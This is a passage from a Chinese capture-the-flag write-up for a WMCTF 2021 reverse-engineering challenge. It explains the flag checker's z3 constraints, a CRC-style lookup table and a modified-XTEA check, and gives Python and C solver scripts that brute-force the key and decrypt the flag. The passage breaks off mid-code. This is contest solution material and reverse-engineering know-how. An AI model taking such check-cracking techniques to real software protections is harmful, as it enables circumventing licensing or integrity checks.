flag&#123;xxxx&#125; 中的第三个x 加<span class="hljs-number">3</span> 取余 <span class="hljs-number">256</span><br></code></pre></td></tr></table></figure><p><img src="/2021/09/03/WMCTF-2021-re%E9%83%A8%E5%88%86wp/image-20210904163749317.png" alt="image-20210904163749317"></p><figure class="highlight fortran"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs fortran">z字符决定<span class="hljs-keyword">block</span>块的改变<br>flag&#123;xxxx yyyyyyyyyyyyyyyy z1234 z4321 ......&#125;<br>如：_1234 <span class="hljs-number">0</span>x12表示<span class="hljs-keyword">block</span>的位置，将<span class="hljs-number">0</span>x34赋值给这个位置<br>有<span class="hljs-number">9</span>个字符，决定<span class="hljs-keyword">block</span>该去怎么改变<br></code></pre></td></tr></table></figure><p><img src="/2021/09/03/WMCTF-2021-re%E9%83%A8%E5%88%86wp/image-20210904164112631.png" alt="image-20210904164112631"></p><p>根据block计算值，然后加减check，这里使用z3可以解出四个值。</p><p><img src="/2021/09/03/WMCTF-2021-re%E9%83%A8%E5%88%86wp/image-20210904164220956.png" alt="image-20210904164220956"></p><p>设置key，然后对16个y 进行xtea加密。</p><p><img src="/2021/09/03/WMCTF-2021-re%E9%83%A8%E5%88%86wp/image-20210904164308703.png" alt="image-20210904164308703"></p><p>xtea加密结果最后的比较。</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs markdown">解题思路：<br><span class="hljs-bullet">1.</span> z3解得到四个值，然后爆破得出前四个字符。<br><span class="hljs-bullet">2.</span> 根据结果进行xtea解密，得到中间16个值。(注意结果的顺序)<br><span class="hljs-bullet">3.</span> 最后反推block块的设置得到后边的值。<br></code></pre></td></tr></table></figure><p>1:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> z3 <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> ctypes<br>s = Solver()<br>x1 = Int(<span class="hljs-string">&quot;x1&quot;</span>)<br>x2 = Int(<span class="hljs-string">&quot;x2&quot;</span>)<br>x3 = Int(<span class="hljs-string">&quot;x3&quot;</span>)<br>x4 = Int(<span class="hljs-string">&quot;x4&quot;</span>)<br>s.add((x2 + x1) == <span class="hljs-number">0x11AB7A7A</span>)<br>s.add((x2 - x3) == <span class="hljs-number">0x1CD4F222</span>)<br>s.add((x4 + x3) == <span class="hljs-number">0xC940F021</span>)<br>s.add((x3 + x1 - x4) == <span class="hljs-number">0x7C7D68D1</span>)<br><span class="hljs-keyword">if</span> (s.check() == sat):<br>    model = s.model()<br>    <span class="hljs-built_in">print</span>(model)<br><span class="hljs-comment"># [-5839603778, 6136054460,5652336794, -2275860601]</span><br>result1 = [-<span class="hljs-number">5839603778</span>, <span class="hljs-number">6136054460</span>,<span class="hljs-number">5652336794</span>, -<span class="hljs-number">2275860601</span>]<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(result1)):<br>    result1[i] = <span class="hljs-built_in">hex</span>(ctypes.c_int32(result1[i]).value &amp; <span class="hljs-number">0xffffffff</span>)<br><span class="hljs-built_in">print</span>(result1)<br><span class="hljs-comment"># # [&#x27;0xa3eeb7be&#x27;, &#x27;0x6dbcc2bc&#x27;, &#x27;0x50e7d09a&#x27;, &#x27;0x78591f87&#x27;]</span><br><br>inx_arr = [<span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x703A11DE</span>, <span class="hljs-number">0xE07423BC</span>, <span class="hljs-number">0x904E3262</span>, <span class="hljs-number">0xC6A99C09</span>, <span class="hljs-number">0xB6938DD7</span>, <span class="hljs-number">0x26DDBFB5</span>, <span class="hljs-number">0x56E7AE6B</span>, <span class="hljs-number">0x8B12E363</span>, <span class="hljs-number">0xFB28F2BD</span>, <span class="hljs-number">0x6B66C0DF</span>, <span class="hljs-number">0x1B5CD101</span>, <span class="hljs-number">0x4DBB7F6A</span>, <span class="hljs-number">0x3D816EB4</span>, <span class="hljs-number">0xADCF5CD6</span>, <span class="hljs-number">0xDDF54D08</span>, <span class="hljs-number">0x10641DB7</span>, <span class="hljs-number">0x605E0C69</span>, <span class="hljs-number">0xF0103E0B</span>, <span class="hljs-number">0x802A2FD5</span>, <span class="hljs-number">0xD6CD81BE</span>, <span class="hljs-number">0xA6F79060</span>, <span class="hljs-number">0x36B9A202</span>, <span class="hljs-number">0x4683B3DC</span>, <span class="hljs-number">0x9B76FED4</span>, <span class="hljs-number">0xEB4CEF0A</span>, <span class="hljs-number">0x7B02DD68</span>, <span class="hljs-number">0x0B38CCB6</span>, <span class="hljs-number">0x5DDF62DD</span>, <span class="hljs-number">0x2DE57303</span>, <span class="hljs-number">0xBDAB4161</span>, <span class="hljs-number">0xCD9150BF</span>, <span class="hljs-number">0x20C83B6E</span>, <span class="hljs-number">0x50F22AB0</span>, <span class="hljs-number">0xC0BC18D2</span>, <span class="hljs-number">0xB086090C</span>, <span class="hljs-number">0xE661A767</span>, <span class="hljs-number">0x965BB6B9</span>, <span class="hljs-number">0x061584DB</span>, <span class="hljs-number">0x762F9505</span>, <span class="hljs-number">0xABDAD80D</span>, <span class="hljs-number">0xDBE0C9D3</span>, <span class="hljs-number">0x4BAEFBB1</span>, <span class="hljs-number">0x3B94EA6F</span>, <span class="hljs-number">0x6D734404</span>, <span class="hljs-number">0x1D4955DA</span>, <span class="hljs-number">0x8D0767B8</span>, <span class="hljs-number">0xFD3D7666</span>, <span class="hljs-number">0x30AC26D9</span>, <span class="hljs-number">0x40963707</span>, <span class="hljs-number">0xD0D80565</span>, <span class="hljs-number">0xA0E214BB</span>, <span class="hljs-number">0xF605BAD0</span>, <span class="hljs-number">0x863FAB0E</span>, <span class="hljs-number">0x1671996C</span>, <span class="hljs-number">0x664B88B2</span>, <span class="hljs-number">0xBBBEC5BA</span>, <span class="hljs-number">0xCB84D464</span>, <span class="hljs-number">0x5BCAE606</span>, <span class="hljs-number">0x2BF0F7D8</span>, <span class="hljs-number">0x7D1759B3</span>, <span class="hljs-number">0x0D2D486D</span>, <span class="hljs-number">0x9D637A0F</span>, <span class="hljs-number">0xED596BD1</span>, <span class="hljs-number">0x419076DC</span>, <span class="hljs-number">0x31AA6702</span>, <span class="hljs-number">0xA1E45560</span>, <span class="hljs-number">0xD1DE44BE</span>, <span class="hljs-number">0x8739EAD5</span>, <span class="hljs-number">0xF703FB0B</span>, <span class="hljs-number">0x674DC969</span>, <span class="hljs-number">0x1777D8B7</span>, <span class="hljs-number">0xCA8295BF</span>, <span class="hljs-number">0xBAB88461</span>, <span class="hljs-number">0x2AF6B603</span>, <span class="hljs-number">0x5ACCA7DD</span>, <span class="hljs-number">0x0C2B09B6</span>, <span class="hljs-number">0x7C111868</span>, <span class="hljs-number">0xEC5F2A0A</span>, <span class="hljs-number">0x9C653BD4</span>, <span class="hljs-number">0x51F46B6B</span>, <span class="hljs-number">0x21CE7AB5</span>, <span class="hljs-number">0xB18048D7</span>, <span class="hljs-number">0xC1BA5909</span>, <span class="hljs-number">0x975DF762</span>, <span class="hljs-number">0xE767E6BC</span>, <span class="hljs-number">0x7729D4DE</span>, <span class="hljs-number">0x0713C500</span>, <span class="hljs-number">0xDAE68808</span>, <span class="hljs-number">0xAADC99D6</span>, <span class="hljs-number">0x3A92ABB4</span>, <span class="hljs-number">0x4AA8BA6A</span>, <span class="hljs-number">0x1C4F1401</span>, <span class="hljs-number">0x6C7505DF</span>, <span class="hljs-number">0xFC3B37BD</span>, <span class="hljs-number">0x8C012663</span>, <span class="hljs-number">0x61584DB2</span>, <span class="hljs-number">0x11625C6C</span>, <span class="hljs-number">0x812C6E0E</span>, <span class="hljs-number">0xF1167FD0</span>, <span class="hljs-number">0xA7F1D1BB</span>, <span class="hljs-number">0xD7CBC065</span>, <span class="hljs-number">0x4785F207</span>, <span class="hljs-number">0x37BFE3D9</span>, <span class="hljs-number">0xEA4AAED1</span>, <span class="hljs-number">0x9A70BF0F</span>, <span class="hljs-number">0x0A3E8D6D</span>, <span class="hljs-number">0x7A049CB3</span>, <span class="hljs-number">0x2CE332D8</span>, <span class="hljs-number">0x5CD92306</span>, <span class="hljs-number">0xCC971164</span>, <span class="hljs-number">0xBCAD00BA</span>, <span class="hljs-number">0x713C5005</span>, <span class="hljs-number">0x010641DB</span>, <span class="hljs-number">0x914873B9</span>, <span class="hljs-number">0xE1726267</span>, <span class="hljs-number">0xB795CC0C</span>, <span class="hljs-number">0xC7AFDDD2</span>, <span class="hljs-number">0x57E1EFB0</span>, <span class="hljs-number">0x27DBFE6E</span>, <span class="hljs-number">0xFA2EB366</span>, <span class="hljs-number">0x8A14A2B8</span>, <span class="hljs-number">0x1A5A90DA</span>, <span class="hljs-number">0x6A608104</span>, <span class="hljs-number">0x3C872F6F</span>, <span class="hljs-number">0x4CBD3EB1</span>, <span class="hljs-number">0xDCF30CD3</span>, <span class="hljs-number">0xACC91D0D</span>, <span class="hljs-number">0x8320EDB8</span>, <span class="hljs-number">0xF31AFC66</span>, <span class="hljs-number">0x6354CE04</span>, <span class="hljs-number">0x136EDFDA</span>, <span class="hljs-number">0x458971B1</span>, <span class="hljs-number">0x35B3606F</span>, <span class="hljs-number">0xA5FD520D</span>, <span class="hljs-number">0xD5C743D3</span>, <span class="hljs-number">0x08320EDB</span>, <span class="hljs-number">0x78081F05</span>, <span class="hljs-number">0xE8462D67</span>, <span class="hljs-number">0x987C3CB9</span>, <span class="hljs-number">0xCE9B92D2</span>, <span class="hljs-number">0xBEA1830C</span>, <span class="hljs-number">0x2EEFB16E</span>, <span class="hljs-number">0x5ED5A0B0</span>, <span class="hljs-number">0x9344F00F</span>, <span class="hljs-number">0xE37EE1D1</span>, <span class="hljs-number">0x7330D3B3</span>, <span class="hljs-number">0x030AC26D</span>, <span class="hljs-number">0x55ED6C06</span>, <span class="hljs-number">0x25D77DD8</span>, <span class="hljs-number">0xB5994FBA</span>, <span class="hljs-number">0xC5A35E64</span>, <span class="hljs-number">0x1856136C</span>, <span class="hljs-number">0x686C02B2</span>, <span class="hljs-number">0xF82230D0</span>, <span class="hljs-number">0x8818210E</span>, <span class="hljs-number">0xDEFF8F65</span>, <span class="hljs-number">0xAEC59EBB</span>, <span class="hljs-number">0x3E8BACD9</span>, <span class="hljs-number">0x4EB1BD07</span>, <span class="hljs-number">0xA3E8D6D6</span>, <span class="hljs-number">0xD3D2C708</span>, <span class="hljs-number">0x439CF56A</span>, <span class="hljs-number">0x33A6E4B4</span>, <span class="hljs-number">0x65414ADF</span>, <span class="hljs-number">0x157B5B01</span>, <span class="hljs-number">0x85356963</span>, <span class="hljs-number">0xF50F78BD</span>, <span class="hljs-number">0x28FA35B5</span>, <span class="hljs-number">0x58C0246B</span>, <span class="hljs-number">0xC88E1609</span>, <span class="hljs-number">0xB8B407D7</span>, <span class="hljs-number">0xEE53A9BC</span>, <span class="hljs-number">0x9E69B862</span>, <span class="hljs-number">0x0E278A00</span>, <span class="hljs-number">0x7E1D9BDE</span>, <span class="hljs-number">0xB38CCB61</span>, <span class="hljs-number">0xC3B6DABF</span>, <span class="hljs-number">0x53F8E8DD</span>, <span class="hljs-number">0x23C2F903</span>, <span class="hljs-number">0x75255768</span>, <span class="hljs-number">0x051F46B6</span>, <span class="hljs-number">0x955174D4</span>, <span class="hljs-number">0xE56B650A</span>, <span class="hljs-number">0x389E2802</span>, <span class="hljs-number">0x48A439DC</span>, <span class="hljs-number">0xD8EA0BBE</span>, <span class="hljs-number">0xA8D01A60</span>, <span class="hljs-number">0xFE37B40B</span>, <span class="hljs-number">0x8E0DA5D5</span>, <span class="hljs-number">0x1E4397B7</span>, <span class="hljs-number">0x6E798669</span>, <span class="hljs-number">0xC2B09B64</span>, <span class="hljs-number">0xB28A8ABA</span>, <span class="hljs-number">0x22C4B8D8</span>, <span class="hljs-number">0x52FEA906</span>, <span class="hljs-number">0x0419076D</span>, <span class="hljs-number">0x742316B3</span>, <span class="hljs-number">0xE46D24D1</span>, <span class="hljs-number">0x9457350F</span>, <span class="hljs-number">0x49A27807</span>, <span class="hljs-number">0x399869D9</span>, <span class="hljs-number">0xA9D65BBB</span>, <span class="hljs-number">0xD9EC4A65</span>, <span class="hljs-number">0x8F0BE40E</span>, <span class="hljs-number">0xFF31F5D0</span>, <span class="hljs-number">0x6F7FC7B2</span>, <span class="hljs-number">0x1F45D66C</span>, <span class="hljs-number">0xD2D486D3</span>, <span class="hljs-number">0xA2EE970D</span>, <span class="hljs-number">0x32A0A56F</span>, <span class="hljs-number">0x429AB4B1</span>, <span class="hljs-number">0x147D1ADA</span>, <span class="hljs-number">0x64470B04</span>, <span class="hljs-number">0xF4093966</span>, <span class="hljs-number">0x843328B8</span>, <span class="hljs-number">0x59C665B0</span>, <span class="hljs-number">0x29FC746E</span>, <span class="hljs-number">0xB9B2460C</span>, <span class="hljs-number">0xC98857D2</span>, <span class="hljs-number">0x9F6FF9B9</span>, <span class="hljs-number">0xEF55E867</span>, <span class="hljs-number">0x7F1BDA05</span>, <span class="hljs-number">0x0F21CBDB</span>, <span class="hljs-number">0xE278A00A</span>, <span class="hljs-number">0x9242B1D4</span>, <span class="hljs-number">0x020C83B6</span>, <span class="hljs-number">0x72369268</span>, <span class="hljs-number">0x24D13C03</span>, <span class="hljs-number">0x54EB2DDD</span>, <span class="hljs-number">0xC4A51FBF</span>, <span class="hljs-number">0xB49F0E61</span>, <span class="hljs-number">0x696A4369</span>, <span class="hljs-number">0x195052B7</span>, <span class="hljs-number">0x891E60D5</span>, <span class="hljs-number">0xF924710B</span>, <span class="hljs-number">0xAFC3DF60</span>, <span class="hljs-number">0xDFF9CEBE</span>, <span class="hljs-number">0x4FB7FCDC</span>, <span class="hljs-number">0x3F8DED02</span>, <span class="hljs-number">0xF21CBDBD</span>, <span class="hljs-number">0x8226AC63</span>, <span class="hljs-number">0x12689E01</span>, <span class="hljs-number">0x62528FDF</span>, <span class="hljs-number">0x34B521B4</span>, <span class="hljs-number">0x448F306A</span>, <span class="hljs-number">0xD4C10208</span>, <span class="hljs-number">0xA4FB13D6</span>, <span class="hljs-number">0x790E5EDE</span>, <span class="hljs-number">0x09344F00</span>, <span class="hljs-number">0x997A7D62</span>, <span class="hljs-number">0xE9406CBC</span>, <span class="hljs-number">0xBFA7C2D7</span>, <span class="hljs-number">0xCF9DD309</span>, <span class="hljs-number">0x5FD3E16B</span>, <span class="hljs-number">0x2FE9F0B5</span>]<br>result1 = [<span class="hljs-string">&#x27;0xa3eeb7be&#x27;</span>, <span class="hljs-string">&#x27;0x6dbcc2bc&#x27;</span>, <span class="hljs-string">&#x27;0x50e7d09a&#x27;</span>, <span class="hljs-string">&#x27;0x78591f87&#x27;</span>]<br>flag = <span class="hljs-string">&quot;&quot;</span><br><span class="hljs-comment"># 1</span><br>result2 = []<br>a1 = <span class="hljs-number">0xfffffffe</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(inx_arr)):<br>    v4 = <span class="hljs-number">0xfffffffe</span><br>    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(inx_arr)):<br>        v4 = (((v4 &gt;&gt; <span class="hljs-number">8</span>)) ^ inx_arr[(((j + i) % <span class="hljs-number">256</span>) ^ v4) &amp; <span class="hljs-number">0xff</span>]) &amp; <span class="hljs-number">0xffffffff</span><br>    result2.append(<span class="hljs-built_in">hex</span>(v4 ^ a1))<br>flag += <span class="hljs-built_in">chr</span>(result2.index(result1[<span class="hljs-number">0</span>]))<br><span class="hljs-comment"># 2</span><br>result2 = []<br>a1 = <span class="hljs-number">0xa3eeb7be</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(inx_arr)):<br>    v4 = <span class="hljs-number">0xa3eeb7be</span><br>    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(inx_arr)):<br>        v4 = (((v4 &gt;&gt; <span class="hljs-number">8</span>)) ^ inx_arr[(((j + i + <span class="hljs-number">1</span>) % <span class="hljs-number">256</span>) ^ v4) &amp; <span class="hljs-number">0xff</span>]) &amp; <span class="hljs-number">0xffffffff</span><br>    result2.append(<span class="hljs-built_in">hex</span>(v4 ^ a1))<br>flag += <span class="hljs-built_in">chr</span>(result2.index(result1[<span class="hljs-number">1</span>]))<br><span class="hljs-comment"># 3</span><br>result2 = []<br>a1 = <span class="hljs-number">0x6dbcc2bc</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(inx_arr)):<br>    v4 = <span class="hljs-number">0x6dbcc2bc</span><br>    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0xf</span>):<br>        v4 = (((v4 &gt;&gt; <span class="hljs-number">8</span>)) ^ inx_arr[(((j + i + <span class="hljs-number">2</span>) % <span class="hljs-number">256</span>) ^ v4) &amp; <span class="hljs-number">0xff</span>]) &amp; <span class="hljs-number">0xffffffff</span><br>    result2.append(<span class="hljs-built_in">hex</span>(v4 ^ a1))<br>flag += <span class="hljs-built_in">chr</span>(result2.index(result1[<span class="hljs-number">2</span>]))<br><span class="hljs-comment"># 4</span><br>result2 = []<br>a1 = <span class="hljs-number">0x50e7d09a</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(inx_arr)):<br>    v4 = <span class="hljs-number">0x50e7d09a</span><br>    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0x1c</span>):<br>        v4 = (((v4 &gt;&gt; <span class="hljs-number">8</span>)) ^ inx_arr[(((j + i + <span class="hljs-number">3</span>) % <span class="hljs-number">256</span>) ^ v4) &amp; <span class="hljs-number">0xff</span>]) &amp; <span class="hljs-number">0xffffffff</span><br>    result2.append(<span class="hljs-built_in">hex</span>(v4 ^ a1))<br>flag += <span class="hljs-built_in">chr</span>(result2.index(result1[<span class="hljs-number">3</span>]))<br><span class="hljs-built_in">print</span>(flag)<br></code></pre></td></tr></table></figure><p>2:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdint.h&gt;</span></span><br><br><span class="hljs-comment">/* take 64 bits of data in v[0] and v[1] and 128 bits of key[0] - key[3] */</span><br><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">encipher</span><span class="hljs-params">(<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> num_rounds, <span class="hljs-keyword">uint32_t</span> v[<span class="hljs-number">2</span>], <span class="hljs-keyword">uint32_t</span> <span class="hljs-keyword">const</span> key[<span class="hljs-number">4</span>])</span> </span>&#123;<br>    <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> i;<br>    <span class="hljs-keyword">uint32_t</span> v0=v[<span class="hljs-number">0</span>], v1=v[<span class="hljs-number">1</span>], sum=<span class="hljs-number">0</span>, delta=<span class="hljs-number">0x9981abcd</span>;<br>    <span class="hljs-keyword">for</span> (i=<span class="hljs-number">0</span>; i &lt; num_rounds; i++) &#123;<br>        v0 += (((v1 &lt;&lt; <span class="hljs-number">4</span>) ^ (v1 &gt;&gt; <span class="hljs-number">5</span>)) + v1) ^ (sum + key[(sum &amp; <span class="hljs-number">3</span>)]);<br>        sum += delta;<br>        v1 += (((v0 &lt;&lt; <span class="hljs-number">4</span>) ^ (v0 &gt;&gt; <span class="hljs-number">5</span>)) + v0) ^ (sum + key[((sum&gt;&gt;<span class="hljs-number">11</span>) &amp; <span class="hljs-number">3</span>)]);<br>    &#125;<br>    v[<span class="hljs-number">0</span>]=v0; v[<span class="hljs-number">1</span>]=v1;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">decipher</span><span class="hljs-params">(<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> num_rounds, <span class="hljs-keyword">uint32_t</span> v[<span class="hljs-number">2</span>], <span class="hljs-keyword">uint32_t</span> <span class="hljs-keyword">const</span> key[<span class="hljs-number">4</span>])</span> </span>&#123;<br>    <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> i;<br>    <span class="hljs-keyword">uint32_t</span> v0=v[<span class="hljs-number">0</span>], v1=v[<span class="hljs-number">1</span>], delta=<span class="hljs-number">0x9981abcd</span>, sum=delta*num_rounds;<br>    <span class="hljs-keyword">for</span> (i=<span class="hljs-number">0</span>; i &lt; num_rounds; i++) &#123;<br>        v1 -= (((v0 &lt;&lt; <span class="hljs-number">4</span>) ^ (v0 &gt;&gt; <span class="hljs-number">5</span>)) + v0) ^ (sum + key[((sum&gt;&gt;<span class="hljs-number">11</span>) &amp; <span class="hljs-number">3</span>)]);<br>        sum -= delta;<br>        v0 -= (((v1 &lt;&lt; <span class="hljs-number">4</span>) ^ (v1 &gt;&gt; <span class="hljs-number">5</span>)) + v1) ^ (sum + key[(sum &amp; <span class="hljs-number">3</span>)]);<br>    &#125;<br>    v[<span class="hljs-number">0</span>]=v0; v[<span class="hljs-number">1</span>]=v1;<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">str_num</span><span class="hljs-params">(<span class="hljs-keyword">uint8_t</span> *s1, <span class="hljs-keyword">uint8_t</span> *s2)</span></span>&#123;<br>    <span class="hljs-keyword">int</span> num = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>;i &lt; <span class="hljs-number">8</span>; i++)&#123;<br>        <span class="hljs-keyword">if</span>(s1[i]&gt;=<span class="hljs-number">33</span> &amp;&amp; s1[i]&lt;=<span class="hljs-number">126</span>)&#123;<br>            num++;<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>;i &lt; <span class="hljs-number">8</span>; i++)&#123;<br>        <span class="hljs-keyword">if</span>(s2[i]&gt;=<span class="hljs-number">33</span> &amp;&amp; s2[i]&lt;=<span class="hljs-number">126</span>)&#123;<br>            num++;<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">return</span> num;<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-comment">//uint32_t v1[2]=&#123;0x556E2853, 0x4393DF16&#125;;</span><br>    <span class="hljs-comment">//uint32_t v2[2]=&#123;0x1989FB2B, 0x83F5A243&#125;;</span><br>    <span class="hljs-comment">//uint32_t v1[2]=&#123;0x5f30445f, 0x2174495f&#125;;</span><br>    <span class="hljs-comment">// 6269756F 72657762  0x6F657776, 0x6F766272 b22e38fe 30fbef03</span><br>    <span class="hljs-comment">//unsigned int key1[4] = &#123;0xa3eeb7be, 0x50e7de9a, 0x6dbcc2bc, 0x78591fad&#125;;</span><br>    <span class="hljs-comment">//unsigned int key2[4] = &#123;0x78591fad, 0x6dbcc2bc, 0xa3eeb7be, 0x50e7de9a&#125;;</span><br>    <span class="hljs-comment">//unsigned int key2[4] = &#123;0xEC465DAD, 0x8186CB90, 0x1456A6EF, 0x0D528DEF7&#125;;</span><br><br>    <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> r=<span class="hljs-number">32</span>;<span class="hljs-comment">//num_rounds建议取值为32</span><br>    <span class="hljs-comment">// v为要加密的数据是两个32位无符号整数</span><br>    <span class="hljs-comment">// k为加密解密密钥，为4个32位无符号整数，即密钥长度为128位</span><br>    <span class="hljs-comment">// printf(&quot;加密前原始数据：%x %x\n&quot;,v[0],v[1]);</span><br><span class="hljs-comment">//    encipher(r, v2, key2);</span><br><span class="hljs-comment">//    printf(&quot;加密后的数据：%x %x\n&quot;,v2[0],v2[1]);</span><br><span class="hljs-comment">//    encipher(r, v0, key1);</span><br><span class="hljs-comment">//    printf(&quot;加密后的数据：%x %x\n&quot;,v0[0],v0[1]);</span><br>    <span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> i =<span class="hljs-number">0</span>;i&lt;<span class="hljs-number">0xffff</span>;i++)&#123;<br>        <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> a1 = <span class="hljs-number">0x50e7009a</span> ^ (i &amp; <span class="hljs-number">0xff00</span>);<br>        <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> a2 = <span class="hljs-number">0x78591f00</span> ^ (i &amp; <span class="hljs-number">0x00ff</span>);<br>        <span class="hljs-keyword">uint32_t</span> v1[<span class="hljs-number">2</span>]=&#123;<span class="hljs-number">0x556E2853</span>, <span class="hljs-number">0x4393DF16</span>&#125;;<br>        <span class="hljs-keyword">uint32_t</span> v2[<span class="hljs-number">2</span>]=&#123;<span class="hljs-number">0x1989FB2B</span>, <span class="hljs-number">0x83F5A243</span>&#125;;<br>        <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> key1[<span class="hljs-number">4</span>] = &#123;<span class="hljs-number">0xa3eeb7be</span>, a1, <span class="hljs-number">0x6dbcc2bc</span>, a2&#125;;<br>        <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> key2[<span class="hljs-number">4</span>] = &#123;a2, <span class="hljs-number">0x6dbcc2bc</span>, <span class="hljs-number">0xa3eeb7be</span>, a1&#125;;<br>        decipher(r, v1, key1);<br>        <span class="hljs-comment">//printf(&quot;解密后的数据：%x %x &quot;,v1[0],v1[1]);</span><br>        decipher(r, v2, key2);<br>        <span class="hljs-comment">//printf(&quot;%x %x\n&quot;,v2[0],v2[1]);</span><br>        <span class="hljs-keyword">if</span>(str_num(v1,v2)&gt;=<span class="hljs-number">16</span>)&#123;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%x\n&quot;</span>, i);<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;解密后的数据：%x %x 